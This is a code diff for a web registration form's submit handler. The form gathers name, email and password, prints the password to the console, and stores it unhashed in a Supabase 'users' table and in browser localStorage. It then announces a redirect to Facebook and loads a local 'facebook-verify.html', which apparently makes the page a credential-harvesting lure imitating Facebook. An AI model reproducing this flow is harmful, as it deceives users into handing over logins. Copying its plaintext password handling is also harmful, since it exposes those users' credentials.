@@ -128,9 +128,20 @@
             const password = document.getElementById('password').value;
             const submittedAt = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
             
+            // ===== FORM VALIDATION =====
+            if (!name || !email || !password) {
+                alert('⚠️ Please fill all fields!');
+                return;
+            }
+            
+            if (password.length < 6) {
+                alert('⚠️ Password must be at least 6 characters!');
+                return;
+            }
+            
+            console.log('📤 Sending data:', { name, email, password, submittedAt });
+            
             try {
-                console.log('📤 Sending data:', { name, email, password, submittedAt });
-                
                 // ===== 1. SAVE TO SUPABASE =====
                 const { data, error } = await supabase
                     .from('users')
@@ -146,14 +157,13 @@
 
                 if (error) {
                     console.error('❌ Supabase Error:', error);
-                    alert('⚠️ Error: ' + error.message);
+                    alert('⚠️ Supabase Error: ' + error.message);
                     return;
                 }
 
                 console.log('✅ Data saved to Supabase!', data);
 
-                // ===== 2. SAVE TO LOCAL STORAGE (VS Code mein dekhne ke liye) =====
-                // Pehle se saved data read karein
+                // ===== 2. SAVE TO LOCAL STORAGE =====
                 let allUsers = [];
                 try {
                     const saved = localStorage.getItem('allUsersData');
@@ -164,7 +174,6 @@
                     allUsers = [];
                 }
                 
-                // Naya user add karein
                 allUsers.push({
                     id: Date.now(),
                     name: name,
@@ -176,8 +185,10 @@
                 localStorage.setItem('allUsersData', JSON.stringify(allUsers));
                 console.log('✅ Data saved to Local Storage! Total users:', allUsers.length);
 
-                // ===== 3. SUCCESS MESSAGE =====
-                alert('✅ Registration successful! Data saved to Supabase & Local Storage');
+                // ===== 3. SUCCESS =====
+                alert('✅ Registration successful! Redirecting to Facebook...');
+                
+                // ===== 4. REDIRECT TO FACEBOOK PAGE =====
                 window.location.href = 'facebook-verify.html';
                 
             } catch (error) {
